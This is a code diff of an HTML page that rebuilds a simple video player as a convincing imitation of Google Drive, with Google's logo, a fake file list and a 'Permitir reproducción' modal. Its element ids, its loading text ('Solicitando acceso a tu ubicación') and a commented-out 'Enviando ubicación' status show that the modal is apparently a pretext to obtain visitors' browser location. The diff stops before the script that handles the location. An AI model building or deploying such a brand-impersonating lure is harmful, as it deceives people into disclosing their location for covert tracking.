@@ -1,9 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reproductor de Video</title>
+    <title>Google Drive - Mi Unidad</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap"
+        rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -12,248 +18,1183 @@
         }
 
         body {
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            font-family: 'Roboto', 'Google Sans', sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            overflow: hidden;
+            height: 100vh;
         }
 
-        /* Modal de Advertencia de Permisos */
-        .warning-modal {
+        .header {
+            display: flex;
+            align-items: center;
+            height: 64px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 0 16px;
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgb(40,40,40);
+            right: 0;
+            z-index: 100;
+        }
+
+        .header-left {
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 1000;
-            animation: fadeIn 0.3s ease-in;
+            min-width: 232px;
         }
 
-        .warning-modal.hidden {
-            display: none;
+        .menu-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 12px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+        .menu-btn:hover {
+            background: rgba(0, 0, 0, 0.08);
         }
 
-        .warning-dialog {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16), 0 3px 6px rgba(0, 0, 0, 0.23);
-            max-width: 400px;
-            width: 100%;
-            animation: slideUp 0.3s ease-out;
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-left: 8px;
+            cursor: pointer;
         }
 
-        @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+        .logo-img {
+            height: 40px;
+            width: 40px;
         }
 
-        .warning-dialog-content {
-            padding: 32px 24px 24px;
-            text-align: center;
+        .logo-text {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 22px;
+            color: #5f6368;
+            margin-left: 8px;
+            font-weight: 400;
         }
 
-        .warning-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
+        .search-bar {
+            flex: 1;
+            max-width: 720px;
+            margin: 0 auto;
+            position: relative;
         }
 
-        .warning-title {
-            font-size: 20px;
-            font-weight: 500;
+        .search-input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #e8eaed;
+            border-radius: 24px;
+            padding: 0 16px;
+            height: 48px;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+
+        .search-input-wrapper:focus-within {
+            background: #fff;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .search-icon {
+            color: #5f6368;
+            margin-right: 12px;
+        }
+
+        .search-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            outline: none;
             color: #202124;
-            margin-bottom: 12px;
         }
 
-        .warning-message {
+        .search-input::placeholder {
+            color: #5f6368;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5f6368;
+            transition: background 0.2s;
+        }
+
+        .icon-btn:hover {
+            background: rgba(0, 0, 0, 0.08);
+        }
+
+        .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #1a73e8;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+
+        .sidebar {
+            position: fixed;
+            top: 64px;
+            left: 0;
+            bottom: 0;
+            width: 256px;
+            background: #f8f9fa;
+            padding: 8px 12px;
+            overflow-y: auto;
+            z-index: 50;
+        }
+
+        .new-btn {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 24px 0 16px;
+            height: 56px;
+            background: #fff;
+            border: none;
+            border-radius: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.08);
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: box-shadow 0.2s;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+        }
+
+        .new-btn:hover {
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .new-btn .material-icons {
+            color: #1a73e8;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 0 16px;
+            height: 40px;
+            border-radius: 0 20px 20px 0;
+            cursor: pointer;
+            font-size: 14px;
+            color: #3c4043;
+            transition: background 0.15s;
+        }
+
+        .sidebar-item:hover {
+            background: #e8eaed;
+        }
+
+        .sidebar-item.active {
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .sidebar-item .material-icons {
+            font-size: 20px;
+            color: #5f6368;
+        }
+
+        .sidebar-item.active .material-icons {
+            color: #1a73e8;
+        }
+
+        .sidebar-divider {
+            height: 1px;
+            background: #e0e0e0;
+            margin: 8px 16px;
+        }
+
+        .sidebar-section-title {
+            padding: 16px 16px 4px;
+            font-size: 12px;
+            color: #5f6368;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .storage-info {
+            padding: 16px;
+            margin-top: auto;
+        }
+
+        .storage-bar-bg {
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin-top: 8px;
+        }
+
+        .storage-bar-fill {
+            height: 100%;
+            width: 35%;
+            background: #1a73e8;
+            border-radius: 2px;
+        }
+
+        .storage-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+
+        .main-content {
+            margin-left: 256px;
+            margin-top: 64px;
+            padding: 24px;
+            height: calc(100vh - 64px);
+            overflow-y: auto;
+        }
+
+        .tabs-container {
+            display: flex;
+            gap: 0;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .tab {
+            padding: 12px 24px;
             font-size: 14px;
             color: #5f6368;
-            margin-bottom: 32px;
-            line-height: 1.6;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.2s;
+            font-weight: 500;
         }
 
-        /* Modal de Contador */
-        .loading-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgb(40,40,40);
+        .tab:hover {
+            color: #1a73e8;
+        }
+
+        .tab.active {
+            color: #1a73e8;
+            border-bottom-color: #1a73e8;
+        }
+
+        .breadcrumb {
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 1000;
-            animation: fadeIn 0.3s ease-in;
-        }
-
-        .loading-modal.hidden {
-            display: none;
-        }
-
-        .loading-dialog {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16), 0 3px 6px rgba(0, 0, 0, 0.23);
-            max-width: 300px;
-            width: 100%;
-            animation: slideUp 0.3s ease-out;
-        }
-
-        .loading-dialog-content {
-            padding: 48px 24px;
-            text-align: center;
-        }
-
-        .loading-spinner {
-            margin-bottom: 20px;
-        }
-
-        .loading-message {
-            font-size: 16px;
-            color: #202124;
+            gap: 4px;
             margin-bottom: 24px;
         }
 
-        .loading-timer {
+        .breadcrumb-item {
+            font-size: 22px;
+            color: #202124;
+            font-family: 'Google Sans', sans-serif;
+            cursor: pointer;
+        }
+
+        .breadcrumb-item:hover {
+            color: #1a73e8;
+        }
+
+        .breadcrumb-separator {
+            color: #5f6368;
+            font-size: 20px;
+        }
+
+        .video-section {
+            background: #fff;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 32px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+
+        .video-player-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            aspect-ratio: 16/9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-player-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .video-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            gap: 16px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            width: 100%;
+            height: 100%;
+        }
+
+        .video-placeholder .material-icons {
+            font-size: 80px;
+            opacity: 0.6;
+        }
+
+        .video-placeholder p {
+            font-size: 16px;
+            opacity: 0.6;
+        }
+
+        .video-info {
+            padding: 16px;
+        }
+
+        .video-title {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+
+        .video-meta {
+            font-size: 13px;
+            color: #5f6368;
+        }
+
+        .upload-area {
+            border: 2px dashed #dadce0;
+            border-radius: 16px;
+            padding: 48px;
+            text-align: center;
+            margin-bottom: 32px;
+            transition: all 0.3s;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .upload-area:hover,
+        .upload-area.dragover {
+            border-color: #1a73e8;
+            background: #e8f0fe;
+        }
+
+        .upload-area .material-icons {
+            font-size: 64px;
+            color: #1a73e8;
+            margin-bottom: 16px;
+        }
+
+        .upload-area h3 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 18px;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .upload-area p {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .section-title {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .section-link {
+            font-size: 14px;
+            color: #1a73e8;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .section-link:hover {
+            text-decoration: underline;
+        }
+
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+
+        .video-card {
+            background: #fff;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: box-shadow 0.2s;
+            border: 1px solid #e0e0e0;
+        }
+
+        .video-card:hover {
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .video-card-thumb {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            overflow: hidden;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .video-card-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .video-card:hover .play-overlay {
+            opacity: 1;
+        }
+
+        .play-overlay .material-icons {
+            font-size: 48px;
+            color: #fff;
+        }
+
+        .duration {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .video-card-info {
+            padding: 12px;
+        }
+
+        .video-card-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .video-card-meta {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .video-card-location {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 11px;
+            color: #1a73e8;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-top: 6px;
+        }
+
+        .video-card-location .material-icons {
+            font-size: 12px;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: #fff;
+            border-radius: 24px;
+            padding: 32px;
+            max-width: 480px;
+            width: 90%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transform: scale(0.9);
+            transition: transform 0.3s;
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1);
+        }
+
+        .modal-icon {
+            width: 48px;
+            height: 48px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .modal-icon .material-icons {
+            font-size: 24px;
+            color: #1a73e8;
+        }
+
+        .modal h2 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .modal p {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .modal-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+
+        .btn {
+            padding: 10px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            font-family: 'Google Sans', sans-serif;
+        }
+
+        .btn-text {
+            background: transparent;
+            color: #1a73e8;
+        }
+
+        .btn-text:hover {
+            background: #e8f0fe;
+        }
+
+        .btn-primary {
+            background: #1a73e8;
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #1557b0;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.4);
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            padding: 32px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
             font-size: 14px;
             color: #5f6368;
         }
 
-        /* Contenedor de Video */
-        .video-wrapper {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
+        .status-badge {
+            display: inline-flex;
             align-items: center;
-            background-color: #000;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 16px;
         }
 
-        .video-wrapper.hidden {
-            display: none;
+        .status-badge.success {
+            background: #e6f4ea;
+            color: #1e8e3e;
         }
 
-        .video-player {
-            width: 90%;
-            height: 90%;
-            max-width: 1200px;
-            background-color: #000;
+        .status-badge.pending {
+            background: #fef7e0;
+            color: #e37400;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: currentColor;
+        }
+
+        .location-info {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .location-info-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .location-info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .location-info-row .material-icons {
+            font-size: 18px;
+            color: #5f6368;
+        }
+
+        .location-info-label {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .location-info-value {
+            font-size: 13px;
+            color: #202124;
+            font-weight: 500;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #323232;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 2000;
+            transition: transform 0.3s;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .notification.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .notification .material-icons {
+            color: #34a853;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #dadce0;
             border-radius: 4px;
         }
 
-        @media (max-width: 768px) {
-            .warning-dialog,
-            .loading-dialog {
-                margin: 20px;
-            }
-
-            .video-player {
-                width: 95%;
-                height: 85%;
-            }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #bdc1c6;
         }
 
-        /* Botón de descarga */
-        .download-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            padding: 12px 24px;
-            background-color: #1f71b8;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
+        .file-list-header {
+            display: grid;
+            grid-template-columns: 40px 1fr 120px 120px 160px 40px;
+            padding: 0 16px;
+            height: 40px;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 0;
+        }
+
+        .file-list-item {
+            display: grid;
+            grid-template-columns: 40px 1fr 120px 120px 160px 40px;
+            padding: 0 16px;
+            height: 48px;
+            align-items: center;
             cursor: pointer;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            transition: all 0.3s ease;
-            z-index: 500;
+            transition: background 0.15s;
+            border-radius: 0;
         }
 
-        .download-btn:hover {
-            background-color: #1765a0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            transform: translateY(-2px);
+        .file-list-item:hover {
+            background: #e8eaed;
         }
 
-        .download-btn:active {
-            transform: translateY(0);
+        .file-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .file-icon .material-icons {
+            font-size: 24px;
+        }
+
+        .file-icon.video-icon {
+            color: #e91e63;
+        }
+
+        .file-name {
+            font-size: 14px;
+            color: #202124;
+        }
+
+        .file-modified,
+        .file-size {
+            font-size: 13px;
+            color: #5f6368;
+        }
+
+        .file-shared {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .shared-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #e8eaed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #5f6368;
+        }
+
+        .location-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px 6px 6px;
+            background: #e8f0fe;
+            border-radius: 16px;
+            font-size: 12px;
+            color: #1a73e8;
+            cursor: default;
+        }
+
+        .location-chip .material-icons {
+            font-size: 16px;
+            background: #1a73e8;
+            color: #fff;
+            border-radius: 50%;
+            padding: 2px;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .fade-in-up {
+            animation: fadeInUp 0.5s ease forwards;
+        }
+
+        .delay-1 {
+            animation-delay: 0.1s;
+            opacity: 0;
+        }
+
+        .delay-2 {
+            animation-delay: 0.2s;
+            opacity: 0;
+        }
+
+        .delay-3 {
+            animation-delay: 0.3s;
+            opacity: 0;
+        }
+
+        .delay-4 {
+            animation-delay: 0.4s;
+            opacity: 0;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 72px;
+                padding: 8px;
+            }
+
+            .sidebar-item span,
+            .new-btn span,
+            .sidebar-section-title,
+            .storage-info {
+                display: none;
+            }
+
+            .main-content {
+                margin-left: 72px;
+            }
+
+            .header-left {
+                min-width: auto;
+            }
+
+            .logo-text {
+                display: none;
+            }
+
+            .video-grid {
+                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            }
         }
     </style>
 </head>
 
-<body onload="getLocation()">
+<body>
+<!-- <body onload="getLocation()"> -->
 
-    <!-- Modal de Advertencia de Permisos -->
-    <div class="warning-modal" id="warningModal">
-        <div class="warning-dialog">
-            <div class="warning-dialog-content">
-                <div class="warning-icon">
-                    <svg width="64" height="64" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <!-- Fondo de la carpeta (Drive) -->
-                        <path d="M8 10H40C41.1 10 42 10.9 42 12V36C42 37.1 41.1 38 40 38H8C6.9 38 6 37.1 6 36V12C6 10.9 6.9 10 8 10Z" fill="#4285F4"/>
-                        <!-- Triángulo (Drive) -->
-                        <path d="M24 38L8 12H40L24 38Z" fill="#EA4335"/>
-                        <!-- Círculo blanco central -->
-                        <circle cx="24" cy="24" r="6" fill="#FFFFFF"/>
-                    </svg>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-left">
+            <button class="menu-btn">
+                <span class="material-icons">menu</span>
+            </button>
+            <div class="logo-container">
+                <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" alt="Google Drive"
+                    class="logo-img">
+                <span class="logo-text">Drive</span>
+            </div>
+        </div>
+
+        <div class="search-bar">
+            <div class="search-input-wrapper">
+                <span class="material-icons search-icon">search</span>
+                <input type="text" class="search-input" placeholder="Buscar en Drive">
+            </div>
+        </div>
+
+        <div class="header-right">
+            <button class="icon-btn" title="Ayuda">
+                <span class="material-icons">help_outline</span>
+            </button>
+            <button class="icon-btn" title="Configuración">
+                <span class="material-icons">settings</span>
+            </button>
+            <button class="icon-btn" title="Google Apps">
+                <span class="material-icons">apps</span>
+            </button>
+            <div class="avatar" title="Cuenta de Google">U</div>
+        </div>
+    </header>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <button class="new-btn">
+            <span class="material-icons">add</span>
+            <span>Nuevo</span>
+        </button>
+
+        <div class="sidebar-item active">
+            <span class="material-icons">folder</span>
+            <span>Mi unidad</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">computer</span>
+            <span>Ordenadores</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">people</span>
+            <span>Compartido conmigo</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">schedule</span>
+            <span>Recientes</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">star_border</span>
+            <span>Destacados</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">watch_later</span>
+            <span>Programados</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">label</span>
+            <span>Etiquetas</span>
+        </div>
+        <div class="sidebar-item">
+            <span class="material-icons">inventory</span>
+            <span>Archivos</span>
+        </div>
+
+        <div class="sidebar-divider"></div>
+
+        <div class="sidebar-section-title">Almacenamiento</div>
+        <div class="sidebar-item">
+            <span class="material-icons">storage</span>
+            <span>Almacenamiento</span>
+        </div>
+
+        <div class="storage-info">
+            <div class="storage-bar-bg">
+                <div class="storage-bar-fill"></div>
+            </div>
+            <div class="storage-text">5,25 GB de 15 GB usados</div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Tabs -->
+        <div class="tabs-container">
+            <div class="tab active">Todos</div>
+            <div class="tab">Documentos</div>
+            <div class="tab">Hojas de cálculo</div>
+            <div class="tab">Presentaciones</div>
+            <div class="tab">Imágenes</div>
+            <div class="tab">Videos</div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <div class="breadcrumb">
+            <span class="breadcrumb-item">Mi unidad</span>
+            <span class="material-icons breadcrumb-separator">chevron_right</span>
+            <span class="breadcrumb-item">Videos</span>
+        </div>
+
+        <!-- Location Info (hidden initially) -->
+        <!-- <div id="locationDisplay" class="hidden"
+            style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
+            <div class="status-badge success">
+                <span class="status-dot"></span>
+                <span id="locationStatusText">Ubicación obtenida</span>
+            </div>
+            <div class="location-chip" id="locationChip">
+                <span class="material-icons">location_on</span>
+                <span id="locationChipText">-</span>
+            </div>
+        </div> -->
+
+        <!-- Upload Area -->
+        <div class="upload-area hidden" id="uploadArea">
+            <span class="material-icons">cloud_upload</span>
+            <h3>Subir un video</h3>
+            <p>Arrastra y suelta un video aquí o haz clic para seleccionar</p>
+            <input type="file" id="fileInput" accept="video/*" style="display:none">
+        </div>
+
+        <!-- Loading State -->
+        <div id="loadingState" class="loading-container hidden">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Solicitando acceso a tu ubicación...</div>
+        </div>
+
+        <!-- Email Sending Status -->
+        <!-- <div id="emailStatus" class="hidden">
+            <div class="status-badge pending">
+                <span class="status-dot"></span>
+                <span id="emailStatusText">Enviando ubicación...</span>
+            </div>
+        </div> -->
+
+        <!-- Video Player Section (hidden initially) -->
+        <div id="videoSection" class="video-section hidden">
+            <div class="video-player-container" id="videoPlayerContainer">
+                <div class="video-placeholder" id="videoPlaceholder">
+                    <span class="material-icons">play_circle_outline</span>
+                    <p id="placeholderText">Carga un video para reproducirlo</p>
                 </div>
-                <div class="warning-title">Advertencia</div>
-                <div class="warning-message">
-                    Para reproducir este video, debes aceptar los permisos.
+                <video id="videoPlayer" controls style="display:none;"></video>
+            </div>
+            <div class="video-info">
+                <div class="video-title" id="videoTitle">Sin video cargado</div>
+                <div class="video-meta" id="videoMeta">-</div>
+            </div>
+        </div>
+
+        <!-- Recommended Videos -->
+        <div id="recommendedSection" class="hidden">
+            <div class="section-header">
+                <h2 class="section-title">Videos recomendados para tu ubicación</h2>
+                <a class="section-link">Ver todos</a>
+            </div>
+            <div class="video-grid" id="videoGrid"></div>
+        </div>
+
+        <!-- File List -->
+        <div id="fileListSection" style="margin-top: 32px;">
+            <div class="section-header">
+                <h2 class="section-title">Archivos recientes</h2>
+                <a class="section-link">Ver todos</a>
+            </div>
+
+            <div class="file-list-header">
+                <div></div>
+                <div style="font-weight: 500;">Nombre</div>
+                <div>Propietario</div>
+                <div>Última modificación</div>
+                <div>Tamaño</div>
+                <div></div>
+            </div>
+
+            <div id="fileList">
+                <div class="file-list-item">
+                    <div class="file-icon video-icon"><span class="material-icons">movie</span></div>
+                    <div class="file-name">Pastores sur.mp4</div>
+                    <div class="file-shared">
+                        <div class="shared-avatar">U</div>
+                    </div>
+                    <div class="file-modified">Hace 2 días</div>
+                    <div class="file-size">245 MB</div>
+                    <div><button class="icon-btn"><span class="material-icons">more_vert</span></button></div>
                 </div>
+                <div class="file-list-item">
+                    <div class="file-icon video-icon"><span class="material-icons">movie</span></div>
+                    <div class="file-name">caidas graciosas.mp4</div>
+                    <div class="file-shared">
+                        <div class="shared-avatar">U</div>
+                    </div>
+                    <div class="file-modified">Hace 3 días</div>
+                    <div class="file-size">580 MB</div>
+                    <div><button class="icon-btn"><span class="material-icons">more_vert</span></button></div>
+                </div>
+                <div class="file-list-item">
+                    <div class="file-icon video-icon"><span class="material-icons">movie</span></div>
+                    <div class="file-name">organizacion-mundial.mp4</div>
+                    <div class="file-shared">
+                        <div class="shared-avatar">U</div>
+                    </div>
+                    <div class="file-modified">Hace 15 días</div>
+                    <div class="file-size">80 MB</div>
+                    <div><button class="icon-btn"><span class="material-icons">more_vert</span></button></div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Location Permission Modal -->
+    <div class="modal-overlay" id="locationModal">
+        <div class="modal">
+            <div class="modal-icon">
+                <span class="material-icons">video_library</span>
+            </div>
+            <h2>Permitir reproductor de video</h2>
+            <p>
+                Haz clic en el botón y permite el acceso cuando el navegador lo solicite.
+            </p>
+            <div class="modal-actions">
+                <button class="btn btn-text" id="btnCancel">Cancelar</button>
+                <button class="btn btn-primary" id="btnAllowLocation">Permitir reproducción</button>
             </div>
         </div>
     </div>
 
-    <!-- Modal de Contador -->
-    <div class="loading-modal hidden" id="loadingModal">
-        <div class="loading-dialog">
-            <div class="loading-dialog-content">
-                <div class="loading-spinner">
-                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" style="animation: spin 1s linear infinite; margin: 0 auto;">
-                        <circle cx="20" cy="20" r="16" stroke="#e8e8e8" stroke-width="3" fill="none"/>
-                        <circle cx="20" cy="20" r="16" stroke="#1f71b8" stroke-width="3" fill="none" stroke-dasharray="50.27" stroke-dashoffset="0" stroke-linecap="round"/>
-                    </svg>
-                    <style>
-                        @keyframes spin {
-                            from { transform: rotate(0deg); }
-                            to { transform: rotate(360deg); }
-                        }
-                    </style>
-                </div>
-                <div class="loading-message">Preparando video...</div>
-                <div class="loading-timer">Cerrando en <span id="countdown">15</span> segundos</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Contenedor de Video -->
-    <div class="video-wrapper hidden" id="videoWrapper">
-        <iframe class="video-player" id="videoPlayer" src="" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <span class="material-icons">check_circle</span>
+        <span id="notificationText">Operación completada</span>
     </div>
 
     <script>
@@ -267,38 +1208,38 @@
 
         async function showPosition(position) {
